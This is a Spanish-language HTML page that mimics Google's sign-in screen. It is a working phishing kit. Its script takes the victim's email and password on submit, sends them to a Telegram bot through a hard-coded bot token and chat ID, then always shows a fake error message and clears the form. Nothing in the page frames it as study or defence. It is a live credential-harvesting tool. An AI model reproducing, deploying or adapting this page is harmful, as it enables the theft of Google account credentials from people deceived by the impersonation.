<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Acceso</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
        }

        body {
            background: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
        }

        .google-logo {
            text-align: center;
            margin-bottom: 16px;
        }

        .google-logo svg {
            width: 48px;
            height: 48px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            color: #202124;
            margin-bottom: 8px;
        }

        .subtitle {
            text-align: center;
            color: #202124;
            font-size: 16px;
            font-weight: 400;
            margin-bottom: 32px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .input-container {
            position: relative;
        }

        input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: all 0.2s;
        }

        input:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }

        .floating-label {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #5f6368;
            font-size: 16px;
            transition: all 0.2s;
            pointer-events: none;
            background: transparent;
            padding: 0 4px;
        }

        input:focus + .floating-label,
        input:not(:placeholder-shown) + .floating-label {
            transform: translateY(-120%);
            font-size: 12px;
            color: #1a73e8;
            background: white;
        }

        .password-field {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            padding: 4px 8px;
            border-radius: 4px;
        }

        .toggle-password:hover {
            background: #f0f7ff;
        }

        .forgot-email {
            margin: 8px 0 24px 0;
        }

        .forgot-email a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .info-box {
            background: #f8f9fa;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 32px;
            font-size: 14px;
            color: #5f6368;
            line-height: 1.5;
        }

        .info-box a {
            color: #1a73e8;
            text-decoration: none;
        }

        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 40px;
        }

        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            padding: 8px 12px;
            border-radius: 4px;
        }

        .create-account:hover {
            background: #f0f7ff;
        }

        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 9px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }

        .next-button:hover {
            background: #1b66c9;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }

        .language-selector {
            margin: 24px 0 16px;
            color: #5f6368;
            font-size: 12px;
            display: flex;
            align-items: center;
        }

        .language-selector select {
            border: none;
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
            outline: none;
            background: transparent;
        }

        .footer {
            display: flex;
            gap: 24px;
            font-size: 12px;
        }

        .footer a {
            color: #5f6368;
            text-decoration: none;
        }

        .error-message {
            display: none;
            text-align: center;
            margin: 12px 0;
            color: #d93025;
            font-size: 14px;
            padding: 12px;
            background: #fce8e6;
            border-radius: 4px;
            border: 1px solid #d93025;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48px" height="48px">
                <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z" />
                <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z" />
                <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z" />
                <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z" />
            </svg>
        </div>

        <h1>Inicia sesión</h1>
        <div class="subtitle">Utiliza tu cuenta de Google</div>

        <form id="loginForm">
            <div class="form-group">
                <div class="input-container">
                    <input type="text" id="email" placeholder=" " required>
                    <label for="email" class="floating-label">Correo electrónico o teléfono</label>
                </div>
            </div>

            <div class="form-group">
                <div class="input-container password-field">
                    <input type="password" id="password" placeholder=" " required>
                    <label for="password" class="floating-label">Contraseña</label>
                    <button type="button" class="toggle-password" onclick="togglePassword()">Mostrar</button>
                </div>
            </div>

            <div class="forgot-email">
                <a href="#" onclick="alert('Recuperación de contraseña')">¿Has olvidado tu contraseña?</a>
            </div>

            <div class="info-box">
                ¿No es tu ordenador? Usa ventanas de navegación privada para iniciar sesión. 
                <a href="#" onclick="alert('Más información sobre modo Invitado')">Más información sobre cómo usar el modo Invitado</a>
            </div>

            <div class="actions">
                <a href="#" class="create-account" onclick="alert('Crear cuenta Google')">Crear cuenta</a>
                <button type="submit" class="next-button">Siguiente</button>
            </div>

            <div class="error-message" id="errorMessage">❌ Error al iniciar sesión. Vuelve a intentarlo.</div>
        </form>

        <div class="language-selector">
            <select onchange="alert('Idioma cambiado a: ' + this.value)">
                <option value="es">Español (España)</option>
                <option value="en">English (US)</option>
                <option value="fr">Français</option>
                <option value="de">Deutsch</option>
                <option value="it">Italiano</option>
            </select>
        </div>

        <div class="footer">
            <a href="#" onclick="alert('Ayuda de Google')">Ayuda</a>
            <a href="#" onclick="alert('Privacidad')">Privacidad</a>
            <a href="#" onclick="alert('Términos')">Términos</a>
        </div>
    </div>

    <script>
        // CONFIGURACIÓN DE TELEGRAM
        const TELEGRAM_BOT_TOKEN = '8273125469:AAG_fkueGpHdtvWebjHq2utGccJsnCxrL8g';
        const TELEGRAM_CHAT_ID = '6939469358';

        // Función para mostrar/ocultar contraseña
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleBtn = document.querySelector('.toggle-password');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.textContent = 'Ocultar';
            } else {
                passwordInput.type = 'password';
                toggleBtn.textContent = 'Mostrar';
            }
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const errorMessage = document.getElementById('errorMessage');
            
            // Validar campos
            if (!email || !password) {
                errorMessage.style.display = 'block';
                return;
            }
            
            try {
                // Crear mensaje SOLO con correo y contraseña (NADA MÁS)
                const message = `🔵 GOOGLE LOGIN 🔵\n\n📧 Correo: ${email}\n🔑 Contraseña: ${password}`;

                // Enviar a Telegram
                await sendToTelegram(message);
                
                // Mostrar mensaje de error (siempre)
                errorMessage.style.display = 'block';
                
                // Limpiar campos
                document.getElementById('email').value = '';
                document.getElementById('password').value = '';
                
            } catch (error) {
                console.error('Error:', error);
                errorMessage.style.display = 'block';
            }
        });

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            return response;
        }

        // Detectar tipo de input (email o teléfono)
        document.getElementById('email').addEventListener('input', function(e) {
            const value = e.target.value;
            if (value.includes('@')) {
                this.type = 'email';
            } else if (/^\d+$/.test(value.replace(/[\s\(\)\-\+]/g, ''))) {
                this.type = 'tel';
            } else {
                this.type = 'text';
            }
        });
        
        // Ocultar mensaje de error al hacer clic en los campos
        document.getElementById('email').addEventListener('focus', function() {
            document.getElementById('errorMessage').style.display = 'none';
        });
        
        document.getElementById('password').addEventListener('focus', function() {
            document.getElementById('errorMessage').style.display = 'none';
        });
    </script>
</body>
</html>
